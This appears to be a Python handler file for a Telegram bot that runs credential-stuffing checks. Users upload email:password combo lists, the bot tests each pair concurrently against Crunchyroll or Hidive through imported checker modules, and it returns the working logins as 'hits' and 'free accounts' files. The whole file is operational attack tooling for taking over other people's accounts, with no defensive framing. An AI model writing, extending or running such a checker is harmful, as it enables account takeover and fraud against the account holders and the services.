"""
bot/handlers/files.py
~~~~~~~~~~~~~~~~~~~~~
Handles document uploads and the dynamic inline-keyboard UI for selecting
a processing module.

Flow
----
1. Authorized user uploads a ``.txt`` file.
2. Bot downloads it temporarily and replies with an
   :class:`InlineKeyboardMarkup` for module selection.
3. On :class:`CallbackQuery`, a unique ``task_id`` is generated, the job
   is pushed to the :class:`TaskManager`, and the message is updated with
   the queued status.
4. The worker processes each line, throttles status edits, and outputs
   positive results dynamically.
"""

from __future__ import annotations

import asyncio
import os
import time
from pathlib import Path
from typing import Optional

import aiofiles
import aiohttp
from pyrogram import Client, filters
from pyrogram.errors import FloodWait, MessageNotModified
from pyrogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)

from bot.core.client import app
from bot.core.config import OWNER_ID, STATUS_INTERVAL, TEMP_DIR
from bot.database.db import is_admin, is_authorized
from bot.modules import crunchyroll as cr_mod
from bot.modules import hidive as hd_mod
from bot.utils.logger import setup_logger
from bot.utils.task_manager import task_manager

log = setup_logger("handlers.files")

# ── Processing-module registry ──────────────────────────────────────────
# Each key is a callback-data identifier, and the value is a label shown
# on the inline keyboard.  Add new modules here to extend the bot.
MODULES: dict[str, str] = {
    "mod_cr": "🍥 Crunchyroll",
    "mod_hd": "📺 Hidive",
}

# Maps module keys to (check_func, format_hit, format_hit_line).
_CHECKERS = {
    "mod_cr": (cr_mod.check_account, cr_mod.format_hit, cr_mod.format_hit_line),
    "mod_hd": (hd_mod.check_account, hd_mod.format_hit, hd_mod.format_hit_line),
}

# Max concurrent HTTP checks within a single file-processing task.
_INNER_CONCURRENCY = 10

# Map of pending file paths keyed by "<user_id>:<message_id>".
_pending_files: dict[str, str] = {}


# ── Helpers ─────────────────────────────────────────────────────────────

async def _is_allowed(user_id: int) -> bool:
    """Return ``True`` if the user may upload files."""
    if user_id == OWNER_ID:
        return True
    if await is_admin(user_id):
        return True
    return await is_authorized(user_id)


def _build_module_keyboard() -> InlineKeyboardMarkup:
    """Build an inline keyboard with one button per processing module."""
    buttons = [
        [InlineKeyboardButton(text=label, callback_data=key)]
        for key, label in MODULES.items()
    ]
    return InlineKeyboardMarkup(buttons)


async def _safe_edit(message: Message, text: str) -> None:
    """Edit a message, handling FloodWait and duplicate-text errors."""
    try:
        await message.edit_text(text)
    except FloodWait as fw:
        log.warning("FloodWait for %s s – sleeping", fw.value)
        await asyncio.sleep(fw.value)
        try:
            await message.edit_text(text)
        except (FloodWait, MessageNotModified):
            pass
    except MessageNotModified:
        pass  # Text hasn't actually changed; ignore.


# ── Document upload handler ─────────────────────────────────────────────

@app.on_message(
    filters.document & filters.private & ~filters.forwarded
)
async def document_handler(_client: Client, message: Message) -> None:
    """Handle an incoming ``.txt`` document upload."""
    user_id = message.from_user.id

    if not await _is_allowed(user_id):
        return  # Silently ignore unauthorized users.

    doc = message.document

    # Validate file extension.
    if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        await message.reply_text("⚠️ Please upload a `.txt` file only.")
        return

    # Validate file size (limit: 20 MB).
    if doc.file_size and doc.file_size > 20 * 1024 * 1024:
        await message.reply_text("⚠️ File too large. Maximum size is 20 MB.")
        return

    # Download to temp directory.
    file_path = str(TEMP_DIR / f"{user_id}_{doc.file_name}")
    try:
        await message.download(file_name=file_path)
    except Exception:
        log.exception("Failed to download document from %s", user_id)
        await message.reply_text("❌ Failed to download your file.")
        return

    # Store reference and present module selection keyboard.
    sent = await message.reply_text(
        "📂 **File received!**\nSelect a processing module:",
        reply_markup=_build_module_keyboard(),
    )
    _pending_files[f"{user_id}:{sent.id}"] = file_path
    log.info("File %s queued for module selection by %s", doc.file_name, user_id)


# ── Callback query handler (module selection) ──────────────────────────

@app.on_callback_query(filters.regex(r"^mod_"))
async def module_callback_handler(
    _client: Client, callback: CallbackQuery
) -> None:
    """Handle module selection from the inline keyboard."""
    user_id = callback.from_user.id
    msg_id = callback.message.id
    key = f"{user_id}:{msg_id}"

    file_path = _pending_files.pop(key, None)
    if file_path is None:
        await callback.answer("⚠️ Session expired. Please upload again.")
        return

    module_key = callback.data
    module_label = MODULES.get(module_key, module_key)

    # Submit the job to the task manager.
    async def _cleanup() -> None:
        """Remove the temp file associated with this task."""
        try:
            os.remove(file_path)
            log.info("Cleaned up temp file %s", file_path)
        except OSError:
            pass

    task_id = task_manager.submit(
        _process_file(
            file_path=file_path,
            module_key=module_key,
            message=callback.message,
        ),
        cleanup=_cleanup,
    )

    await _safe_edit(
        callback.message,
        (
            f"⚙️ **Module:** {module_label}\n"
            f"🆔 **Task ID:** `{task_id}`\n"
            f"📌 **Status:** Queued"
        ),
    )
    await callback.answer("Task queued!")
    log.info(
        "Task %s created for module %s by user %s",
        task_id,
        module_key,
        user_id,
    )


# ── File-processing worker ─────────────────────────────────────────────

async def _check_single_line(
    line: str,
    check_func,
    session: aiohttp.ClientSession,
    semaphore: asyncio.Semaphore,
) -> Optional[dict]:
    """Parse and check a single email:password combo line."""
    if ":" not in line:
        return None
    email, password = line.split(":", 1)
    email = email.strip()
    password = password.strip()
    if not email or not password:
        return None
    async with semaphore:
        return await check_func(email, password, session)


async def _process_file(
    file_path: str,
    module_key: str,
    message: Message,
) -> None:
    """Read lines from *file_path* and process each through the selected
    module.  Updates the Telegram message with throttled status edits.
    """
    module_label = MODULES.get(module_key, module_key)
    checker = _CHECKERS.get(module_key)
    if checker is None:
        await _safe_edit(message, f"❌ Unknown module: {module_key}")
        return
    check_func, format_hit, format_hit_line = checker

    lines: list[str] = []

    try:
        async with aiofiles.open(file_path, mode="r", encoding="utf-8",
                                 errors="replace") as f:
            lines = [
                line.strip() async for line in f if line.strip()
            ]
    except Exception:
        log.exception("Error reading file %s", file_path)
        await _safe_edit(message, "❌ Failed to read the uploaded file.")
        return

    total = len(lines)
    if total == 0:
        await _safe_edit(message, "⚠️ The uploaded file is empty.")
        return

    hits: list[dict] = []
    free_accounts: list[dict] = []
    checked = 0
    errors = 0
    free = 0
    last_edit = 0.0

    await _safe_edit(
        message,
        (
            f"⚙️ **Module:** {module_label}\n"
            f"📌 **Status:** Processing…\n"
            f"📊 **Progress:** 0/{total}"
        ),
    )

    sem = asyncio.Semaphore(_INNER_CONCURRENCY)

    async def _process_line(line: str) -> Optional[dict]:
        """Check a single line and return the result (or None)."""
        return await _check_single_line(line, check_func, session, sem)

    async def _status_updater() -> None:
        """Periodically update the Telegram status message."""
        nonlocal last_edit
        while checked < total:
            await asyncio.sleep(STATUS_INTERVAL)
            now = time.monotonic()
            if now - last_edit >= STATUS_INTERVAL:
                last_edit = now
                await _safe_edit(
                    message,
                    (
                        f"⚙️ **Module:** {module_label}\n"
                        f"📌 **Status:** Processing…\n"
                        f"📊 **Progress:** {checked}/{total}\n"
                        f"✅ **Hits:** {len(hits)} | 🆓 Free: {free} | ❌ Errors: {errors}"
                    ),
                )

    async with aiohttp.ClientSession(
        cookie_jar=aiohttp.DummyCookieJar(),
    ) as session:
        # Launch the periodic status updater in the background.
        updater = asyncio.create_task(_status_updater())

        # Process lines concurrently in batches.
        for batch_start in range(0, total, _INNER_CONCURRENCY):
            batch = lines[batch_start:batch_start + _INNER_CONCURRENCY]
            tasks = [_process_line(line) for line in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            for result in results:
                checked += 1
                if isinstance(result, BaseException):
                    errors += 1
                    log.debug("Error checking line: %s", result)
                elif result is not None:
                    if result.get("free"):
                        free += 1
                        free_accounts.append(result)
                    else:
                        hits.append(result)

        # Stop the status updater.
        updater.cancel()
        try:
            await updater
        except asyncio.CancelledError:
            pass

    # ── Final summary ───────────────────────────────────────────────────
    hit_preview = "\n".join(
        format_hit_line(h) for h in hits[:20]
    )
    overflow = f"\n…and {len(hits) - 20} more." if len(hits) > 20 else ""

    await _safe_edit(
        message,
        (
            f"✅ **Done!**\n"
            f"⚙️ **Module:** {module_label}\n"
            f"📊 **Checked:** {total}\n"
            f"🎯 **Hits:** {len(hits)} | 🆓 Free: {free} | ❌ Errors: {errors}\n\n"
            f"```\n{hit_preview}{overflow}\n```"
        ),
    )

    # Save hits to a results file and send it.
    if hits:
        results_path = str(
            Path(file_path).with_suffix(".results.txt")
        )
        try:
            async with aiofiles.open(results_path, "w",
                                     encoding="utf-8") as rf:
                await rf.write(
                    "\n".join(format_hit_line(h) for h in hits)
                )
            await message.reply_document(
                document=results_path,
                caption=f"🎯 {len(hits)} hits from {module_label}",
            )
        except Exception:
            log.exception("Failed to send results file")
        finally:
            try:
                os.remove(results_path)
            except OSError:
                pass

    # Save free accounts to a separate file and send it.
    if free_accounts:
        free_path = str(
            Path(file_path).with_suffix(".free.txt")
        )
        try:
            async with aiofiles.open(free_path, "w",
                                     encoding="utf-8") as ff:
                await ff.write(
                    "\n".join(
                        f"{a['email']}:{a['password']}"
                        for a in free_accounts
                    )
                )
            await message.reply_document(
                document=free_path,
                caption=f"🆓 {free} free accounts from {module_label}",
            )
        except Exception:
            log.exception("Failed to send free accounts file")
        finally:
            try:
                os.remove(free_path)
            except OSError:
                pass

    # Cleanup temp input file.
    try:
        os.remove(file_path)
    except OSError:
        pass
